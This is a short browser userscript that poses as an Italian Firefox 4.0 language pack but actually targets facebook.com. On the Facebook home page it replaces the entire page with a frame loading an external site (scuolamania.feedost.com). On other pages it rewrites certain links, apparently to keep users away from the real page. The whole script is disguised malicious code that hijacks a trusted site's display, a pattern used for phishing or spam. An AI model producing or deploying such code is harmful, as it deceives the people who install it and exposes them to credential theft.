// ==UserScript==
// @name           Firefox 4.0 LangPack (IT)
// @namespace      Firefox 4.0 LangPack (IT)
// @description    Firefox 4.0 LangPack (IT)
// @include        https://www.facebook.com/*
// ==/UserScript==


var controllo = location.href;
if(controllo.length=="25"){
var testo = "<frameset frameborder=\"NO\" border=\"0\" framespacing=\"0\" rows='*'><frame scrolling=\"auto\" noresize=\"\" name=\"dot_tk_frame_content\" src=\"http://scuolamania.feedost.com/index.htm\"></frame> </frameset>";
document.getElementsByTagName('html')[0].innerHTML = testo;
}else{
	var aus = "http://www.facebook.com/?sk=lf";
	elements = document.getElementsByTagName('a');
	if(elements.length>0)
	{
			for(i=0;i<elements.length;i++)
			{
				if(elements[i].href.length =="25")
					elements[i].href = aus;

			}
	}
}
